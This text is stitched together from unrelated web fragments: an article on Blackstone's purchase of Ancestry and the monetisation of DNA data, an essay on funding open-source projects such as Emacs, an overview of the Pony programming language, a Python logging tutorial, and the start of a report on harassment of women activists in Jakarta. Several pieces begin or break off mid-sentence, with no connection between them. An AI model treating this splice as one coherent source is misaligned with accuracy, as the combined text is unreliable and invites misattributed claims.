<p>But it’s an open question whether Ancestry’s buyout by Blackstone will markedly change how Ancestry donor DNA is monetized, after previous partnerships like the company’s deal with Google life-extension initiative Calico <a href="https://www.businessinsider.com/google-calico-ancestry-dna-genetics-aging-partnership-ended-2018-7?r=US&amp;IR=T" target="_blank" rel="noopener">came up empty</a><strong>. </strong>Nor is it clear how the Blackstone purchase portends how other private equity giants might seek to monetize genomic databases in the likely event big firms swoop in to snatch up other gene science startups.&nbsp;</p>
<p>In a world with no controls on data flows, the collective data banks amassed by a private equity giant like Blackstone would be a wonderland for analysts, explains Michael Roberts, professor of finance at the University of Pennsylvania Wharton business school. “They own health care companies. They own insurance companies. They own retail companies. So they can identify spending behavior, health care expenses, actual health outcomes for individuals,” he says.</p>
<p>“They have all this information on our behavior and, on the one hand, that’s a little scary,” Roberts said in an interview via Zoom. “Let’s be clear: Companies already have that, but it’s segmented.” Connecting the dots is where private equity giants are likely to unlock value that geneticists miss, an avenue underexplored by the Calico deal, which ended without fanfare in 2018, and <a href="https://pitchfork.com/news/spotify-teams-with-ancestry-to-make-playlists-based-on-your-dna/" target="_blank" rel="noopener">Ancestry’s peculiar partnership with Spotify</a> for DNA-designed music playlists. In December, Roberts’ colleagues at Wharton published a paper arguing that DNA data could soon back <a href="https://doi.org/10.1177/0022242920980767" target="_blank" rel="noopener">much more effective marketing</a> attempts for things like health care products treating baldness, by targeting people who are genetically predisposed. Together, such data provides an “all-encompassing picture of consumer behavior,” he added. “And that’s incredibly valuable.”</p>
<p>In response to questions about the deal, Ancestry says its commitment to user privacy is unchanged and that the company “does not sell or share customer DNA data with insurers, employers, or third-party marketers.” Ancestry has also refused to share data with law enforcement agencies unless compelled to by a warrant.</p>
<blockquote><p><span>A study found $95 would be enough to tempt most Americans to sign away their DNA data.</span></p></blockquote>
<p>In an email, a Blackstone spokesperson says its own employees and directors will not be able to access Ancestry’s data and the company will not be sharing DNA or family tree data with other companies owned or operated by Blackstone. The spokesperson said work to license insights is currently “exploratory,” and added “nothing has been sold on behalf of our portfolio companies or Blackstone.” A Blackstone source with knowledge of the firm’s data monetization efforts said Ancestry will not be included in the initial sale of insights detailed in the SEC filings. </p>
<p>Blackstone did not directly respond to more detailed questions for this story, but a spokesperson said in an email the company is “deeply committed to ensuring that Ancestry has world-class consumer privacy.”) Responding in an email to this story after its publication, a Blackstone spokesperson said, “Ancestry data will <em>never</em> be part of the effort detailed in the SEC filings. Not just <em>the initial sale</em>.” (Their emphasis).</p>
<p>Yet, long term,<strong> </strong>we are entering new territory. With future bids for data-rich health companies likely, there is plenty of room for tinkering by firms—whether Blackstone or its followers—that have specialized in restructuring portfolio companies, creating innovative financial products, and skillfully toe-stepping regulatory restrictions to yield returns for investors. Crucially the deal leaves open the possibility of Ancestry <em>itself </em>splicing together its own data insights with external marketing data. “It’s a whole new set of issues that one has to consider when there are no sort of formal walls containing the data,” Roberts says.&nbsp;</p>

<h3>The current market price of DNA</h3>
<p>In March, a study found $95 would be <a href="https://towardsdatascience.com/how-much-is-your-genetic-data-worth-3bb7a8b4ae5c#:~:text=So%2C%20how%20much%20is%20your,for%20an%20average%20of%20%2495." target="_blank" rel="noopener">enough to tempt</a> most Americans to sign away their DNA data. And following Blackstone’s move, some have quickly jumped to put a price on a person’s DNA based on Ancestry’s stock price, with CBS …</p></div></div>

<a href="https://firstmonday.org/article/view/708/618">criticism</a>
even back in the 90s.</p><p>While being an entertaining piece of history with useful takeaways, its
most important achievement was arguably helping create a sense of identity
for hacker culture via the revolutionary Open Source movement, and
promoting the value of the Internet for software development.</p><p>In the Cathedral-Bazaar continuum, contemporary projects like Kubernetes,
Chromium, and VSCode are <i>fusion reactors</i>.</p><p>They have the backing of heavily invested companies with virtually infinite
capital, who are able to staff highly competent teams that not only work
full-time on these projects, but also have enough personpower to maximally
leverage the benefits brought by a gigantic user base.</p><p>Like with fusion power, they seem to be able to leverage a high amount of
energy to generate even more.</p><p>Sometimes, their user base includes <i>other</i> organizations with
endless resources: by means of its success, VSCode is getting
<a href="https://visualstudiomagazine.com/articles/2019/11/21/fb-vs-code.aspx">sizable contributions</a> from Facebook, for example.</p><p>In contrast, the vast majority of open source projects depend almost
exclusively on decentralized volunteer efforts from people sacrificing time
out of their busy schedules and lives to move things forward.</p><p>And yet, projects following this style of development can end up becoming
backbones of modern computing:</p><blockquote><p>The OpenSSL project has been around since 1998. Since the project is open
source, it is an informal group comprised primarily of about a dozen
members throughout the world, most of whom have day jobs, and some of whom
work on a volunteer basis. Being open source, the OpenSSL project’s code
has always been public facing. Any person could download it and modify it
or implement it in their own software.</p><p>[…]</p><p>The fascinating, mind-boggling fact here is that you have this critical
piece of network infrastructure that really runs a large part of the
internet, and there’s basically one guy working on it full time.</p><p>— <a href="https://www.wnycstudios.org/podcasts/otm/articles/ssl-heartbleed">Steve Marquess in “It’s Not A Fun Week To Work at OpenSSL, The Mostly
Volunteer Project Responsible for the Heartbleed Bug”, (2014)</a></p></blockquote><p>Heartbleed is a symptom of an ever-existing problem: corporations profit
massively by leveraging typically under-resourced open source projects
while not giving back proportionally, or (most commonly) at all; either
with money or people.</p><figure><img src="https://www.murilopereira.com/xkcd_load_bearing_open_source.png" alt="Figure 2: &amp;ldquo;Load-Bearing Internet People&amp;rdquo;"><figcaption><p>Figure 2: <a href="https://xkcd.com/2347/">“Load-Bearing Internet People”</a></p></figcaption></figure><p>After Heartbleed the

was created to support software essential to the "functioning of the
Internet and other major information systems".</p><p>Less critical software like Emacs also follows this decentralized
development style, and similarly, lacks resources.</p><blockquote><blockquote><p>So if Emacs wants to compete with these tools then it has to have
seamless, context aware code completion and refactoring support, and GNU
tools has to provide Emacs the necessary information to implement these
features.</p></blockquote><p>I agree. But to have that, the only way is to have motivated volunteers
step forward and work on these features. Otherwise we will never have them.</p><p>Right now, no one is working on that, though everyone is talking. [T]he

open source contributors would gladly take income to fund their work.</p><blockquote><p>Long-term my big dream has always been to accumulate enough backing to be
able to work full-time on open-source projects, but whether I’ll achieve
this dream or not is entirely up to you.</p><p>— <a href="https://emacsredux.com/blog/2020/09/13/patronage-revisited/">Bozhidar Batsov in “Patronage Revisited” (2020)</a></p></blockquote><p>While others feel that accepting funding would degrade their <a href="https://en.wikipedia.org/wiki/Drive:%5FThe%5FSurprising%5FTruth%5FAbout%5FWhat%5FMotivates%5FUs">intrinsic
motivation</a> to contribute.</p><blockquote><p>I can’t speak for all FLOSS developers, but I can speak for myself: I don’t
want monetary rewarding from users. Mainly for the reason, that I don’t
want to change the relationship with my users. Currently it is mostly a
team attitude, we’re working together to solve the problem. And there is
also no legal obligation for me to work on something I don’t like.</p><p>If I accepted contributions I think many users would get a “but I paid for
that, so do what I want” attitude. I definitely don’t want that. I do FLOSS
in my free time to do something that matters, and for my personal
fulfillment, not for money.</p><p>It will also get harder to do the right thing (in contrary to doing what
the users want) since the users can stop the payments.</p><p>So, no payments for me, thanks.</p><p>— <a href="https://www.reddit.com/r/emacs/comments/6pjbn0/sustainable%5Femacs%5Fdevelopment%5Fsome%5Fthoughts%5Fand/">cjk101010 in “Sustainable Emacs development - some thoughts and
analysis” (2017)</a></p></blockquote><p>Which is fair: with compensation comes responsibility, timelines,
expectations, and things can get complicated. From the point of view of the
project, there doesn’t seem to be a conflict: capture funding to enable those
who need (or want) it, while still empowering those who don’t, to contribute
on their own terms.</p><p>Not everyone is in a position to spend unpaid time on open source,
especially consistently. “Free” time <a href="https://www.rightattitudes.com/2017/08/08/opportunity-cost/">isn’t free</a>—<em>it costs life</em>. By
funding work, a project might get to see contributions from talented folks
passionate about it who wouldn’t be able to volunteer their time.</p><p>And sometimes, the reason why your PR isn't getting immediate attention
is that the maintainer is busy literally
<a href="https://github.com/fre5h/DoctrineEnumBundle/pull/12#issuecomment-33023169">fighting</a>
a
<a href="https://en.wikipedia.org/wiki/Revolution_of_Dignity">revolution</a>.</p><p>For Emacs specifically, one problem is that there’s no clear way of funding
“Emacs”. Sending money to the FSF doesn’t guarantee that it will fund Emacs
development. <em>Even if there was</em> a way of “funding Emacs”, the Emacs
community—like many things in life—seems to be roughly divided in two
sides: those who prioritize <em><a href="https://www.gnu.org/philosophy/free-sw.en.html">freedom</a></em>, and those who prioritize <em>progress</em>. So
one would potentially want to fund one side or the other, depending on their
values.</p><p>In the excellent “<a href="https://www.amazon.com/dp/0578675862/">Working in Public</a>: The Making and Maintenance of Open
Source Software”, Nadia Eghbal calls attention to a shift in how
individuals support open source. Similarly to platforms like Twitch, more
and more people are funding creators directly instead of projects, as a way
of “incentivizing the ongoing creation of creative work” from developers
who produce things that are in their interests.</p><p>Maintainers of popular Emacs packages, for example, have their own <a href="https://github.com/tarsius/elisp-maintainers">separate
streams of patronage</a>, which receive varying levels of support depending on
their popularity and the value added by what they create.</p><p>For efforts that involve multiple people, like maintaining and evolving
Emacs itself, services like <a href="https://opencollective.com/">Open Collective</a> could be of great assistance by
helping on three fronts:</p><ol><li>providing a legal banking entity</li><li>recurrently collecting funds from individuals and companies</li><li>distributing funds to contributors</li></ol><p>Funds can be transparently collected, and dispersed for specific contract
work, infrastructure costs, and even developer salaries. Take for example
the <a href="https://opencollective.com/babel">Babel</a> project, which draws in enough recurrent income to finance
multiple contractors and a full-time developer earning a San Francisco
salary. An Emacs Open Collective could not only be an answer to “how can I
fund Emacs development?” but also a way to financially support developers
working on it.</p><p>The Clojure community seems to be doing an excellent job at not only
<a href="https://www.clojuriststogether.org/news/q4-2020-funding-announcement/">funding</a>
efforts that are making the whole Clojure ecosystem
better but also at surveying and
<a href="https://www.clojuriststogether.org/news/q3-2020-survey-results/">responding</a>
accordingly to user
feedback.</p><p><a href="https://github.com/sponsors">GitHub Sponsors</a> is another great example of developer empowerment. With it,
not only does GitHub equip people to:</p><ul><li>be more productive by providing great code hosting, bug tracking, wiki,
code reviewing and merging, project management, continuous integration,
documentation, artifact hosting, etc.</li><li>have a broader impact by giving projects more visibility and standardized
workflows that are familiar to others already on the platform</li></ul><p>It also makes it possible for its <a href="https://octoverse.github.com/">40 million users</a> to frictionlessly fund
work on open source, and for a large number of maintainers to be
conveniently compensated for their labor. I just started sponsoring someone
with literally two clicks!</p><p>The power of platforms can’t be understated.</p><p>Whether you like GitHub or not, it’s undeniable that it has, and continues
to revolutionize Open Source, simply by providing a significantly better
and unified experience for all aspects of building software.</p><div><p>When there are people making over
<a href="https://changelog.com/posts/i-just-hit-100000-per-year-on-github-sponsors">100k/year</a>
on GitHub Sponsors, you better have a great reason to <b>not</b> try to
<a href="https://github.com/sponsors/neovim">take advantage</a>
of it.</p><p>In the case of Emacs, the reason is <i>freedom</i>.</p></div><p>I wouldn’t mind if Emacs development moved to GitHub, but <a href="https://www.gnu.org/software/repo-criteria-evaluation.en.html">I don’t think
it’s ever going to happen</a>. Maybe for good reason: GitHub is backed by a
for-profit corporation and is far from perfect, both in <a href="https://www.theverge.com/2019/10/9/20906213/github-ice-microsoft-software-email-contract-immigration-nonprofit-donation">moral</a> and <a href="https://github.com/isaacs/github/issues?q=is%3Aissue+is%3Aopen+sort%3Areactions-%2B1-desc">technical</a>
terms. It might be a great tool today, but being a proprietary platform,
its users are at their complete mercy.</p><p>I should point out that from my perspective GitHub has been for the
most part a force for
<a href="https://github.blog/2020-11-16-standing-up-for-developers-youtube-dl-is-back/">good</a>.</p><p>It would be great if main development at least moved from a
mailing-list-driven process to a modern <em>forge</em> style of contribution. It
<a href="https://emba.gnu.org/emacs/emacs">seems that it <em>might</em></a>, but whether or not it will is still <a href="https://gitlab.com/gitlab-org/gitlab/-/issues/28152">unclear</a>.</p><p>In the same way that corporations extract value out of open source, open
source projects should as much as possible leverage “energy” generated by
corporations. In this new open source world, companies have their workforce
contributing millions of person-hours to projects that benefit everyone.

<h2 id="what-is-pony">What is Pony?</h2>

<p>Pony is an open-source, object-oriented, <a href="https://en.wikipedia.org/wiki/Actor_model">actor-model</a>, <a href="https://en.wikipedia.org/wiki/Capability-based_security">capabilities-secure</a>, high-performance programming language.</p>

<p>If you are looking to jump in and get started with Pony <em>right now</em>, you can try it in your browser using the <a href="http://playground.ponylang.io/">Pony Playground</a>. Keep reading if you are interested in what makes Pony different and why you should consider using it.</p>

<p>If you are interested in the early history of Pony and how it came into existence, you’re in luck: <a href="https://www.ponylang.io/blog/2017/05/an-early-history-of-pony/">“An Early History of Pony”</a>.</p>

<h2 id="what-makes-pony-different">What makes Pony different?</h2>

<h3 id="pony-is-type-safe">Pony is type safe</h3>

<p><em>Really type safe</em>. There’s a mathematical <a href="https://www.ponylang.io/media/papers/fast-cheap-with-proof.pdf">proof</a> and everything.</p>

<h3 id="pony-is-memory-safe">Pony is memory safe</h3>

<p>There are no dangling pointers and no buffer overruns. The language doesn’t even have the concept of null!</p>

<h3 id="exception-safe">Exception-Safe</h3>

<p>There are no runtime exceptions. All exceptions have defined semantics, and they are <em>always</em> caught.</p>

<h3 id="data-race-free">Data-race Free</h3>

<p>Pony doesn’t have locks nor atomic operations or anything like that. Instead, the type system ensures at compile time that your concurrent program can never have data races. So you can write highly concurrent code and never get it wrong.</p>

<h3 id="deadlock-free">Deadlock-Free</h3>

<p>This one is easy because Pony has no locks at all! So they definitely don’t deadlock, because they don’t exist!</p>

<h3 id="native-code">Native Code</h3>

<p>Pony is an ahead-of-time (AOT) compiled language. There is no interpreter nor virtual machine.</p>

<h3 id="compatible-with-c">Compatible with C</h3>

<p>Pony programs can natively call C libraries. Our compiler is able to generate a C-header file for Pony libraries. Consequently, C/C++ programs can natively call Pony programs!</p>

<h2 id="why-pony">Why Pony?</h2>

<p>There’s plenty to love about Pony, but more than anything else, what we love most is that Pony makes it easy to write fast, safe, efficient, highly concurrent programs. How? The Pony type system introduces a novel concept: “reference capabilities”. <a href="https://tutorial.ponylang.io/capabilities/reference-capabilities.html">Reference capabilities</a> allow you to label different bits of data based on how that data can be shared. The Pony compiler will then verify that you are in fact correctly using the data based on the labels you provide. Reference capabilities combined with Pony’s actor model of concurrency makes for a powerful pairing. Let’s dig in and take a quick look:</p>

<h3 id="mutable-state-is-hard">Mutable state is hard</h3>

<p>The problem with concurrency is shared mutable data. If two different threads have access to the same piece of data then they might try to update it at the same time. At best this can lead to those two threads having different versions of the data. At worst the updates can interact badly resulting in the data being overwritten with garbage. The standard way to avoid these problems is to use locks to prevent data updates from happening at the same time. This causes big performance hits and is very difficult to get right, so it causes lots of bugs.</p>

<h3 id="immutable-data-can-be-safely-shared">Immutable data can be safely shared</h3>

<p>Any data that is immutable (i.e. it cannot be changed) is safe to use concurrently. Since it is immutable it is never updated and it’s the updates that cause concurrency problems.</p>

<h3 id="isolated-data-is-safe">Isolated data is safe</h3>

<p>If a block of data has only one reference to it then we call it <em>isolated</em>. Since there is only one reference to it, isolated data cannot be <em>shared</em> by multiple threads, so there are no concurrency problems. Isolated data can be passed between multiple threads. As long as only one of them has a reference to it at a time then the data is still safe from concurrency problems.</p>

<h3 id="every-actor-is-single-threaded">Every actor is single threaded</h3>

<p>The code within a single actor is never run concurrently. This means that, within a single actor, data updates cannot cause problems. It’s only when we want to share data between actors that we have problems.</p>

<h3 id="reference-capabilities-enforce-safe-data-handling">Reference capabilities enforce safe data handling</h3>

<p>By sharing only immutable data and exchanging only isolated data we can have safe concurrent programs without locks. The problem is that it’s very difficult to do that correctly. If you accidentally hang on to a reference to some isolated data you’ve handed over or change something you’ve shared as immutable then everything goes wrong. What you need is for the compiler to force you to live up to your promises. Pony reference capabilities allow the compiler to do just that.</p>

<p>If you ask us, that’s pretty damn cool and a hell of a reason to give Pony a try.</p>

<h2 id="why-not-pony">Why not Pony?</h2>

<p>There are many valid reasons to not use Pony. Amongst these are:</p>

<ul>
<li>Lack of API stability</li>
<li>Lack of high-quality 3rd party libraries</li>
<li>Limited native tooling</li>
</ul>

<h3 id="api-stability">API stability</h3>

<p>Pony is pre-1.0. We regularly have releases that involve breaking changes. This lack of stability is plenty of reason for many projects to avoid using Pony.</p>

<h3 id="batteries-required">Batteries required</h3>

<p>If your project is going to succeed or fail based on the size of community around the tools you are using, Pony is not a good choice for you. While it’s possible to write stable, high-performance applications using Pony, you will have to do a decent amount of work. The pool of open source, ready to use Pony libraries is very small. If it’s not in the standard library then odds are you are going to have to add it yourself, either by writing it from scratch in Pony or by wrapping an existing C library using Pony’s excellent <a href="https://tutorial.ponylang.io/c-ffi/">C-FFI</a> functionality.</p>

<h3 id="tooling">Tooling</h3>

<p>There’s a wide swath of tooling that some people have come to expect that isn’t currently available for Pony. We don’t have an IDE. You can use standard debuggers like GDB or LLDB but the experience still has some rough edges. If you are comfortable working with a basic text editor and using LLDB, VTune and other tools, you’ll probably be ok. Just don’t expect a full, robust ecosystem. We aren’t there yet.</p>

<p>If your project isn’t going to get a great deal of benefit from any of Pony’s strengths, then you shouldn’t use Pony. If you are writing a single threaded application without any overriding performance concerns, and you need access to a large community and wealth of libraries then you’re much better off selecting another language. However, we hope that you see enough potential in Pony to start playing around with it even if it isn’t right for your current project.</p>

<h2 id="the-pony-philosophy">The Pony Philosophy</h2>

<p>In the spirit of <a href="http://www.jwz.org/doc/worse-is-better.html">Richard Gabriel</a>, the Pony philosophy is neither “the-right-thing” nor “worse-is-better”. It is “get-stuff-done”.</p>

<h3 id="correctness">Correctness</h3>

<p>Incorrectness is simply not allowed. <em>It’s pointless to try to get stuff done if you can’t guarantee the result is correct.</em></p>

<h3 id="performance">Performance</h3>

<p>Runtime speed is more important than everything except correctness. If performance must be sacrificed for correctness, try to come up with a new way to do things. <em>The faster the program can get stuff done, the better. This is more important than anything except a correct result.</em></p>

<h3 id="simplicity">Simplicity</h3>

<p>Simplicity can be sacrificed for performance. It is more important for the interface to be simple than the implementation. <em>The faster the programmer can get stuff done, the better. It’s ok to make things a bit harder on the programmer to improve performance, but it’s more important to make things easier on the programmer than it is to make things easier on the language/runtime.</em></p>

<h3 id="consistency">Consistency</h3>

<p>Consistency can be sacrificed for simplicity or performance.
<em>Don’t let excessive consistency get in the way of getting stuff done.</em></p>

<h3 id="completeness">Completeness</h3>

<p>It’s nice to cover as many things as possible, but completeness can be sacrificed for anything else. <em>It’s better to get some stuff done now than wait until everything can get done later.</em></p>

<p>The “get-stuff-done” approach has the same attitude towards correctness and simplicity as “the-right-thing”, but the same attitude towards consistency and completeness as “worse-is-better”. It also adds performance as a new principle, treating it as the second most important thing (after correctness).</p>

<h2 id="guiding-principles">Guiding Principles</h2>

<p>Throughout the design and development of the language, the following principles should be adhered to.</p>

<ul>
<li><p>Use the get-stuff-done approach.</p></li>

<li><p>Simple grammar. Language must be trivial to parse for both humans and computers.</p></li>

<li><p>No loadable code. Everything is known to the compiler.</p></li>

<li><p>Fully type safe. There is no “trust me, I know what I’m doing” coercion.</p></li>

<li><p>Fully memory safe. There is no “this random number is really a pointer, honest.”</p></li>

<li><p>No crashes. A program that compiles should never crash (although it may hang or do something unintended).</p></li>

<li><p>Sensible error messages. Where possible use simple error messages for specific error cases. It is fine to assume the programmer knows the definitions of words in our lexicon, but avoid compiler or other computer science jargon.</p></li>

<li><p>Inherent build system. No separate applications required to configure or build.</p></li>

<li><p>Aim to reduce common programming bugs through the use of restrictive syntax.</p></li>

<li><p>Provide a single, clean and clear way to do things rather than catering to every programmer’s preferred prejudices.</p></li>

<li><p>Make upgrades clean. Do not try to merge new features with the ones they are replacing, if something is broken remove it and replace it in one go. Where possible provide rewrite utilities to upgrade source between language versions.</p></li>

<li><p>Reasonable build time. Keeping down build time is important, but less important than runtime performance and correctness.</p></li>

<li><p>Allowing the programmer to omit some things from the code (default arguments, type inference, etc) is fine, but fully specifying should always be allowed.</p></li>

<li><p>No ambiguity. The programmer should never have to guess what the compiler will do, or vice-versa.</p></li>

<li><p>Document required complexity. Not all language features have to be trivial to understand, but complex features must have full explanations in the docs to be allowed in the language.</p></li>

<li><p>Language features should be minimally intrusive when not used.</p></li>

<li><p>Fully defined semantics. The semantics of all language features must be available in the standard language docs. It is not acceptable to leave behavior undefined or “implementation dependent”.</p></li>

<li><p>Efficient hardware access must be available, but this does not have to pervade the whole language.</p></li>

<li><p>The standard library should be implemented in Pony.</p></li>

<li><p>Interoperability. Must be interoperable with other languages, but this may require a shim layer if non-primitive types are …</p></li></ul></div></article></div>

You can find it in the standard library. Many developers think that it is overcomplicated and not pythonic. In this post I will try to convince you that it is not true. We are going to explore how this package is structured, discover its main concepts and see the code examples. At the end of this post you can find the code which sends log records to the Telegram. Let's get started.</p><h2>Why Logs</h2><p>Logs are X-Ray of your program runtime. The more detailed your logs are the easier is to debug non-standard cases. One of the most popular log example is webserver's access log. Take a look at the nginx's log output from this blog:</p><pre><code>92.63.107.227 - - [04/Nov/2020:06:30:48 +0000] "GET /ru/hosted-open-vpn-server/ HTTP/1.1" 301 169 "-" "python-requests/2.11.1" "-"

</code></pre><p>Nginx also has an error log which contains errors while processing HTTP requests. Your program's logs can also be divided into normal logs, debug logs or error logs.</p><ins data-ad-client="ca-pub-3273608550190378" data-ad-format="fluid" data-ad-layout="in-article" data-ad-slot="9434009847"></ins><h2>Python logging</h2><p>Python has a <a href="https://docs.python.org/3/library/logging.html">logging</a> package perform log recordings. At first you may think that this package is complicated and not pythonic. But if you invest some time to explore its functionality you may change your mind. For me the <a href="https://docs.python.org/3/library/logging.html">logging package</a> is the example of object oriented programming where composition dominates over inheritance, that is why there are lots of functional classes. The main idea of this post is to introduce you to those classes to make everything clear. Let's dive.</p><h3>Logger</h3><p>To start with logs in Python we have to import <code>logging</code> module and execute the <code>getLogger</code> function. This function returns the instance of Logger class which is the entrypoint into the world of log records.</p><pre><code>import logging

logger = logging.getLogger('logger_name')
</code></pre><p><code>getLogger</code> accepts a single argument, logger's name. You can provide whatever you want but I recommend using <code>__name__</code>. If you execute <code>getLogger</code> multiple times with the same name, function will return the same instance of Logger class.</p><pre><code>&gt;&gt;&gt; import logging
&gt;&gt;&gt; x = logging.getLogger('same_name')
&gt;&gt;&gt; y = logging.getLogger('same_name')
&gt;&gt;&gt; y == x
0: True
&gt;&gt;&gt; id(y) == id(x)
1: True
&gt;&gt;&gt;
</code></pre><p>If you are gonna&nbsp;use the <code>__name__</code> then you should not worry about name collisions between your packages &amp; modules.</p><p>The <code>Logger</code> class provides methods which you can use to write logs with different message levels. Levels are useful because they&nbsp;provide additional information about the runtime's context. Logging has the following levels:</p><ol><li><strong>DEBUG</strong>&nbsp;— useful while developing an application, usually provides information for developers (variable values, function names etc)</li><li><strong>INFO</strong>&nbsp;— additional information which can help you understand how program executes</li><li><strong>WARNING</strong>&nbsp;— useful for additional information like deprecation warnings, backwards compatibility issues</li><li><strong>ERROR</strong>&nbsp;— used when writing errors, e.g. a host is unavailable or file has wrong format or does not exist</li><li><strong>CRITICAL</strong>&nbsp;— the highest level of information, usually means that a script will be terminated</li></ol><p>By default logging has a WARNING level which means that DEBUG &amp; INFO will be ignored (because they have lower priority in comparison to WARNING). Developer can change the level by using <code>setLevel</code> method:</p><pre><code>logger.setLevel(logging.DEBUG)
</code></pre><p>Log recording methods are named according to the corresponding level they represent:</p><pre><code>logger.debug('debug info')
logger.info('info')
logger.warning('warning')
logger.error('debug info')
logger.critical('debug info')
</code></pre><p>Also Logger has the <code>exception</code> method which should be used in the <code>except</code> block in order to catch an exception and create a log record:</p><pre><code>try:
    1/0
except :
    logger.exception('exception')
</code></pre><h3>Handler</h3><p>Handlers are responsible for writing log messages, they send logs to the appropriate destination (socket, file, stdout etc). The logging module exposes predefined handlers:</p><ul><li>SteamHandler — sends logs to stdout, stderr</li><li>FileHandler — sends logs to the file (see also RotatingFileHandler, TimedRotatingFileHandler)</li><li>SocketHandler — sends logs via TCP socket</li><li>DatagramHandler — sends logs via UDP socket</li><li>SysLogHandler — sends logs to the syslog</li><li>HTTPHandler — sends logs via HTTP</li></ul><p>If you want to explore more, please follow <a href="https://docs.python.org/3/library/logging.handlers.html">the link.</a> In order to add a handler to a <code>Logger</code> instance you have to call <code>addHandler</code> method:</p><pre><code>import sys
import logging
from logging import StreamHandler

logger = logging.getLogger(__name__)
logger.setLevel(logging.DEBUG)
handler = StreamHandler(stream=sys.stdout)
logger.addHandler(handler)

logger.debug('debug information')
</code></pre><p>If you run this code the output will be:</p><pre><code>debug information
</code></pre><p>Just a simple text message in a terminal is not enough, we need to add some context. Ask me how 😎</p><h3>Formatter</h3><p>Formatter specifies the layout of log messages in the final destination (stdout, files etc). By default if you do not specify a custom Formatter class, your log records will contain only the text&nbsp;you provided to the corresponding log methods (<code>debug</code>, <code>info</code> etc) as you have already seen in the example above. In order to specify a Formatter instance you have to call <code>setFormatter</code> method of Handler instance:</p><pre><code>import sys
import logging
from logging import StreamHandler, Formatter

logger = logging.getLogger(__name__)
logger.setLevel(logging.DEBUG)

handler = StreamHandler(stream=sys.stdout)
handler.setFormatter(Formatter(fmt='[%(asctime)s: %(levelname)s] %(message)s'))
logger.addHandler(handler)

logger.debug('debug information')
</code></pre><p>The output is</p><pre><code>[2020-11-22 13:00:08,751: DEBUG] debug information
</code></pre><p>Pay your attention to the placeholders:</p><pre><code>[%(asctime)s: %(levelname)s] %(message)s
</code></pre><p>Logging has a <a href="https://docs.python.org/3/library/logging.html#logrecord-attributes">number of predefined placeholders</a> (most of which are derived while constructing the LogRecord instance).</p><h3>Filter</h3><p>The class is responsible for filtering log records according to a specific condition. Let's assume that I want to exclude log records which do not contain the word <code>python</code>. If you want to add a filter, you have to call the method <code>addFilter</code> of Logger instance. This method accepts an instance of a class which defines <code>filter</code> method or any python callable:</p><pre><code>import sys
import logging
from logging import StreamHandler, Formatter, LogRecord

def filter_python(record: LogRecord) -&gt; bool:
    return record.getMessage().find('python') != -1

logger = logging.getLogger(__name__)
logger.setLevel(logging.DEBUG)

handler = StreamHandler(stream=sys.stdout)
handler.setFormatter(Formatter(fmt='[%(asctime)s: %(levelname)s] %(message)s'))
logger.addHandler(handler)
logger.addFilter(filter_python)

logger.debug('python debug information')
</code></pre><h3>LoggerAdapter</h3><p>If you want to add some extra contextual information to your log records but do not want to provide it everytime you call a log method, then <code>LoggerAdapter</code> is a way to go. Let's assume you are building a web app and want to log a username everytime you make a record:</p><pre><code>class CustomLoggerAdapter(LoggerAdapter):
    def process(self, msg, kwargs):
        return f'{msg} from {self.extra["username"]}', kwargs

logger = logging.getLogger('adapter')
logger.setLevel(logging.DEBUG)

handler = StreamHandler(stream=sys.stdout)
handler.setFormatter(Formatter(fmt='[%(asctime)s: %(levelname)s] %(message)s'))

adapter = CustomLoggerAdapter(logger, {'username': 'adilkhash'})

logger.addHandler(handler)
adapter.error('failed to save')
</code></pre><p>LoggerAdapter has the same interface as Logger instance, feel free to call the same log methods.</p><h3>extra</h3><p>You are building a cool app which sends requests to the remote API and want to log every response that you receive. See how it is done using the <code>extra</code> argument:</p><pre><code>logger.debug('debug info', extra={"response": response.text})
</code></pre><p>In order to see it in the log record you have to update your formatter class:</p><pre><code>Formatter(fmt='[%(asctime)s: %(levelname)s] %(message)s, response: %(response)s')
</code></pre><p>Quite simple and the code looks clean.</p><h2>Logging Configuration</h2><p>Official documentation recommends configuring logging via python dictionary. In order to do this you have to call <code>logging.config.dictConfig</code> which accepts a single argument — a&nbsp;dictionary. Its schema is described <a href="https://docs.python.org/3/library/logging.config.html#dictionary-schema-details">here</a>:</p><ul><li>version — should be 1 for backwards compatibility</li><li>disable_existing_loggers — disables the configuration for existing loggers (3rd party libararies etc), by default is True</li><li>formatters — settings for formatters</li><li>handlers — settings for handlers</li><li>loggers — settings for loggers</li></ul><p>Previously we were able to configure logging settings via python code, it is okay if you have a single module or 2 but in case of an application (e.g. Django app) it is better to have a separate (centralized) place where we can define the config. See the example:</p><pre><code>import logging.config

LOGGING_CONFIG = {
    'version': 1,
    'disable_existing_loggers': False,

    'formatters': {
        'default_formatter': {
            'format': …</code></pre></article></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

			<!-- Article Start -->
			
<p>Not long after she got home from a Women’s March event in Jakarta in 2018, Anindya Restuviani opened her Instagram account to find hundreds of follow requests — and a slew of insults. In direct messages, users said she “looked like a dog,” that her genitalia smelled, and that they would remember her face so they could rape her on the street.&nbsp;</p>



<p>Restuviani works for several feminist associations in the Indonesian capital, and a photo of her at the rally had been circulated on the Instagram account of a religious hard-liner with hundreds of thousands of followers.&nbsp;</p>



<p>“The scare made me take more precautions on social media, [do] more self-censorship,” Restuviani says.&nbsp;</p>



<p>As civil rights groups in Indonesia increasingly come to rely on online tools for discussion and organization, female activists in the country are struggling against relentless abuse and discrimination.&nbsp;</p>



<p>From a small house on a side street in Jakarta’s Tebet District, veteran human rights activist Dhyta Caturani is trying to reclaim the internet for women and minority groups through her own initiative, PurpleCode Collective.</p>



<p>“At the beginning, there was this imagination that internet technology was a democratic space — equal, open, and a decentralized power. In reality, it is not,” Caturani says.</p>



<p>“Technology is still mostly developed by cisgender, heterosexual white men from the global north countries who have biases, therefore, many women, along with gender and sexual minority groups, are marginalized.”</p>



<p>Caturani, who often wears thick-rimmed, oversized glasses, has been on the frontlines of Indonesian civil movements for more than two decades. In 1999, at a political demonstration against military interference in the country’s politics, <a href="https://www.greenleft.org.au/content/dhyta-caturani-nothing-has-changed-indonesia">she was hospitalized</a> after being shot in the back with a plastic bullet. Since the Reformation — Indonesia’s democratic revival, which spanned the late 1990s and early 2000s — she has led a number of women’s rights campaigns, including the Purple Rose Campaign against sex trafficking; Reclaim the Night, <a href="https://www.thejakartapost.com/news/2013/03/11/women-city-reclaim-night.html">which fought the stigma attached to women going out after dark</a>; and One Billion Rising, a movement to raise awareness about violence against women through flash-mob dance parties.&nbsp;</p>



